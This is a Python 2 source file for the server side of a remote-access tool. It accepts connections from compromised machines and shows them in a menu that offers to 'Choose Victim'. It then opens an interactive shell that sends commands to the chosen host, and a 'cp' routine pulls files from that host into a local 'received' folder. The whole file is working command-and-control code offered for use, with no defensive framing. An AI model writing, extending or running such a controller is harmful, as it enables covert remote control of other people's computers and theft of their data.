import socket
import threading
import os
import sys
import uuid
from tabulate import tabulate


class Server:

    def __init__(self, hostname, port):
        self.connections = []
        self.locking = threading.Lock()
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.socket.bind((hostname, port))
        self.socket.listen(5)

    def run(self):
        self._enable_threading()
        Menu(self).main_menu()

    def accept_connections(self):
        while True:
            socket, addr = self.socket.accept()
            with self.locking:
                self.connections.append(ClientConnection(socket, addr))

    def close_connections(self):
        with self.locking:
            for client in self.connections:
                client.close()

    def refresh_connections(self):
        index = 0
        table = []
        with self.locking:
            for client in self.connections:
                if client.sync():
                    table.append((index, client.username, client.adress))
                    index += 1
                else:
                    self.connections.remove(client)
        return table

    def _enable_threading(self):
        thread = threading.Thread(target=self.accept_connections)
        thread.daemon = True
        thread.start()

    def search_client(self, client_id):
        try:
            with self.locking:
                client = self.connections[int(client_id)]
            return client
        except IndexError:
            pass


class Shell:

    def __init__(self, client):
        self.client = client
        self.local_commands = ['cp', 'clear', 'exit', 'help']
        self.stop = False
        self.prompt = self.client.username+'@'+self.client.adress[0] + " $ "

    def run(self):
        while not self.stop:
            input_command = raw_input(self.prompt)
            if input_command in self.local_commands:
                getattr(self, input_command)()
            else:
                input_command = self.command_parser(input_command)
                self.client.socket.sendall(input_command)
                received = self.client.socket.recv(4096)
                print(received)

    def clear(self):
        os.system("clear")

    def cp(self):
        name = uuid.uuid4().hex
        f = open("received/" + name, 'wb')

        while True:
            l = self.client.socket.recv(4096)
            while (l):
                if l.endswith("EOFX"):
                    u = l[:-4]
                    f.write(u)
                    break
                else:
                    f.write(l)
                    l = self.client.socket.recv(4096)
            break
        f.close()

    def exit(self):
        self.stop = True
        os.system('clear')

    def help(self):
        print "HELP!"
        print "I"
        print "NEED"
        print "SOMEBODY"
        print "HELP!"

    def command_parser(self, command):
        command = command.split(' ')
        command = ';'.join(command)
        command += ';'
        return command


class ClientConnection:

    def __init__(self, socket, adress):
        self.socket = socket
        self.adress = adress
        self.username = None

    def close(self):
        self.socket.shutdown(2)
        self.socket.close()

    def sync(self):
        self.socket.sendall("sync;")
        self.username = self.socket.recv(1024)
        return True if self.username else False


class Menu:

    def __init__(self, server):
        self.server = server
        self.menu_actions = {
            'main_menu': self.main_menu,
            '1': self.show_connections,
            '2': self.choose_victim,
            '9': self.back,
            '0': self.exit,
        }

    def main_menu(self):
        print "1. Show Connections"
        print "2. Choose Victim"
        print "\n0. Quit"
        choice = raw_input(">>  ")
        self.exec_menu(choice)
        return

    def exec_menu(self, choice):
        ch = choice.lower()
        if ch == '':
            self.menu_actions['main_menu']()
        else:
            try:
                self.menu_actions[ch]()
            except KeyError:
                os.system('clear')
                print "Invalid selection, please try again.\n"
                self.menu_actions['main_menu']()
        return

    def show_connections(self):
        os.system('clear')
        print "Connections !"
        table = self.server.refresh_connections()
        print(tabulate(table, headers=['Index', 'Name', 'Addr'],
                       tablefmt='psql'))
        self.back()

    def choose_victim(self):
        print "Choose Victim !"
        choice = raw_input(">>  ")
        client = self.server.search_client(choice)
        if client:
            Shell(client).run()
        else:
            os.system('clear')
            print "Invalid selection, please try again.\n"
            self.show_connections()
        self.back()
        return

    def back(self):
        self.menu_actions['main_menu']()

    def exit(self):
        self.server.close_connections()
        sys.exit()
